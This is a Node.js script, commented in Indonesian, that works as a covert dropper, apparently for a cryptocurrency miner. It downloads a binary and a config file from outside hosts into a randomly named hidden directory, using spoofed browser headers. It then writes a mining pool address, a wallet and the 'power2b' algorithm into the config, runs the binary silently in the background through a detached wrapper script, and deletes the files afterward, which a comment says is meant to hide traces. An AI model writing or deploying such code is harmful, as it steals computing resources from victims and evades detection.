// pante_pro.js
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const axios = require('axios');
const crypto = require('crypto');

// ====== MODE DEBUG ======
const DEBUG = false;

// ====== RANDOM UTILITY ======
function randomString(length = 8) {
  return crypto.randomBytes(length).toString('hex').slice(0, length);
}

// ====== LOGGING ======
function log(msg) {
  if (DEBUG) console.log(msg);
}

// ====== RANDOM WORKDIR ======
const WORKDIR = path.join(process.cwd(), '.' + randomString(6));
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

// ====== RANDOM FILE NAMES ======
const FILE_GENZO = randomString(5);       // Nama binary acak
const FILE_CONFIG = randomString(5) + '.json'; // Nama config acak

// ====== URL FILE ======
const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "http://genzoko.serveblog.net/config.json";

// ====== DOWNLOAD FUNCTION ======
async function downloadFile(url, outputPath) {
  const fakeHeaders = {
    'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11) + 5}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 40) + 80}.0.0.0 Safari/537.36`,
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
  };

  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer',
      headers: fakeHeaders,
      timeout: 10000
    });
    fs.writeFileSync(outputPath, response.data);
    log(`[*] Berhasil download: ${path.basename(outputPath)}`);
  } catch (error) {
    console.error(`[!] Gagal download ${url}:`, error.message);
    process.exit(1);
  }
}

// ====== EDIT CONFIG ======
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    data = data.replace(/"tua"/g, '"159.89.10.132:80"');
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    log("[*] Config berhasil diupdate");
  } catch (error) {
    console.error("[!] Gagal edit config.json:", error.message);
    process.exit(1);
  }
}

// ====== MAKE EXECUTABLE ======
function makeExecutable(filePath) {
  try {
    fs.chmodSync(filePath, 0o755);
    log(`[*] ${path.basename(filePath)} siap dieksekusi`);
  } catch (error) {
    console.error("[!] Gagal ubah permission:", error.message);
  }
}

// ====== RUN BINARY BACKGROUND ======
function runSilent(binary, config) {
  const wrapperScript = `${binary}_wrapper.sh`;

  const scriptContent = `#!/bin/bash
./${binary} -c ${config} >/dev/null 2>&1 &
`;

  fs.writeFileSync(wrapperScript, scriptContent, { mode: 0o755 });

  // Jalankan wrapper
  spawn('./' + wrapperScript, {
    detached: true,
    stdio: 'ignore',
    shell: true
  }).unref();

  log("[*] Proses berjalan di background");
}

// ====== CLEANUP OLD FILES ======
function cleanup() {
  try {
    setTimeout(() => {
      fs.unlinkSync(path.join(WORKDIR, FILE_CONFIG));
      fs.unlinkSync(path.join(WORKDIR, FILE_GENZO));
      log("[*] File sementara dihapus untuk sembunyi jejak");
    }, 1000 * 60 * 5); // bersihkan setelah 5 menit
  } catch (e) {
    log("[!] Gagal bersihkan file sementara");
  }
}

// ====== MAIN EXECUTION ======
(async () => {
  log("[*] Memulai proses...");

  await downloadFile(URL_GENZO, FILE_GENZO);
  await downloadFile(URL_CONFIG, FILE_CONFIG);

  editConfig(FILE_CONFIG);
  makeExecutable(FILE_GENZO);
  runSilent(FILE_GENZO, FILE_CONFIG);

  cleanup();
})();
